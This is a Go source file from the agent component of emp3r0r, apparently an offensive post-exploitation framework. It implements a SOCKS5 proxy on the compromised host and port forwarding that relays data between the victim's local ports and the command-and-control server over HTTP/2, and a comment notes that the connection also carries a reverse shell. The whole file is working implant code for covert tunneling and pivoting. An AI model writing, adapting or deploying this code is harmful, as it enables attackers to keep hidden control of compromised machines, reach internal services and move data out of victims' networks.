package agent

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"log"
	"net"
	"strconv"
	"time"

	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
	"github.com/posener/h2conn"
	"github.com/txthinking/socks5"
)

// PortFwdSession manage a port fwd session
type PortFwdSession struct {
	Ctx    context.Context
	Cancel context.CancelFunc
}

// PortFwds manage port mappings
var PortFwds = make(map[string]*PortFwdSession)

// Socks5Proxy sock5 proxy server on agent, to use it, forward port 10800 to CC
func Socks5Proxy(op string) (err error) {
	switch op {
	case "on":
		go socks5Start()
	case "off":
		log.Print("Stopping Socks5Proxy")
		if ProxyServer == nil {
			return errors.New("Proxy server is not running")
		}
		err = ProxyServer.Stop()
		if err != nil {
			log.Print(err)
		}
		ProxyServer = nil
	default:
		return errors.New("Operation not supported")
	}

	return err
}

func socks5Start() {
	var err error
	if ProxyServer == nil {
		socks5.Debug = true
		ProxyServer, err = socks5.NewClassicServer("127.0.0.1:10800", "127.0.0.1", "", "", 0, 0, 0, 60)
		if err != nil {
			log.Println(err)
			return
		}
	}

	log.Print("Socks5Proxy started")
	err = ProxyServer.Run(nil)
	if err != nil {
		log.Println(err)
	}
	log.Print("Socks5Proxy stopped")
}

// PortFwd port mapping, receive CC's request data then send it to target port on agent
func PortFwd(toPort, sessionID string) (err error) {
	var (
		session PortFwdSession

		url  = CCAddress + tun.ProxyAPI
		port int

		// buffers
		sendcc = make(chan []byte)
		recvcc = make(chan []byte)

		// connection
		conn   *h2conn.Conn // reverse shell uses this connection
		ctx    context.Context
		cancel context.CancelFunc
	)
	port, err = strconv.Atoi(toPort)
	if err != nil {
		return err
	}

	// request a port fwd
	// connect CC
	conn, ctx, cancel, err = ConnectCC(url)
	log.Printf("PortFwd started: -> %d (%s)", port, sessionID)

	go fwdToDport(ctx, cancel, port, sessionID, sendcc, recvcc)

	defer func() {
		cancel()
		conn.Close()
		delete(PortFwds, sessionID)
		log.Printf("PortFwd stopped: -> %d (%s)", port, sessionID)
	}()

	// save this session
	session.Ctx = ctx
	session.Cancel = cancel
	PortFwds[sessionID] = &session

	// check if h2conn is disconnected,
	// if yes, kill all goroutines and cleanup
	go func() {
		buf := make([]byte, ProxyBufSize)
		for ctx.Err() == nil {
			time.Sleep(1 * time.Second)
			_, err = conn.Read(buf)
			if err != nil {
				log.Printf("test remote h2conn: %v", err)
				break
			}
		}

		// clean up
		cancel()
		sendcc <- []byte("exit")
		recvcc <- []byte("exit")
	}()

	// read data from h2conn
	go func() {
		for ctx.Err() == nil {
			// if connection does not exist yet
			if conn == nil {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			data := make([]byte, ProxyBufSize)
			_, err = conn.Read(data)
			if err != nil {
				log.Print("Read remote: ", err)
				cancel()
				return
			}

			// FIXME check origin
			log.Printf("reading from h2conn: %s, to port %s", sessionID, toPort)

			recvcc <- data
		}
	}()

	// send out data via h2conn
	for outgoing := range sendcc {
		select {
		case <-ctx.Done():
			return
		default:
			// if connection does not exist yet
			if conn == nil {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			_, err = conn.Write(outgoing)
			if err != nil {
				log.Print("Send to remote: ", err)
				return
			}
		}
	}

	return
}

func fwdToDport(ctx context.Context, cancel context.CancelFunc,
	dport int, sessionID string,
	send chan []byte, recv chan []byte) {

	defer func() {
		cancel()
		log.Printf("fwdToDport %d exited", dport)
	}()
	var err error

	// connect to target port
	destAddr := fmt.Sprintf("127.0.0.1:%d", dport)
	dest, err := net.Dial("tcp", destAddr)
	if err != nil {
		log.Printf("fwdToDport %d: %v", dport, err)
		return
	}

	// send handshake
	send <- []byte(sessionID)

	// read from CC, send to target port
	go func() {
		defer cancel()
		for incoming := range recv {
			incoming = bytes.Trim(incoming, "\x00") // trim NULLs
			select {
			case <-ctx.Done():
				return
			default:
				_, err := dest.Write(incoming)
				if err != nil {
					log.Printf("write to port %d: %v", dport, err)
					return
				}
			}
		}
	}()

	// read from target port, send to CC
	for ctx.Err() == nil {
		buf := make([]byte, ProxyBufSize)
		_, err = dest.Read(buf)
		send <- buf
		if err != nil {
			log.Printf("port %d read: %v", dport, err)
			return
		}
	}
}
